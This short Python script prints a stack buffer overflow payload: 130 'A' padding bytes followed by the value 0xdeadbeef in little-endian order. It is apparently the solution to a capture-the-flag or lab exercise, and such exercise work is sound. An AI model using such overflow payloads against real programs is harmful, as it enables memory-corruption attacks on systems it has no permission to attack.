#!/usr/bin/env python3

import sys

sys.stdout.buffer.write(b'A' * 130 + bytearray(b'\xef\xbe\xad\xde') + b'\n')
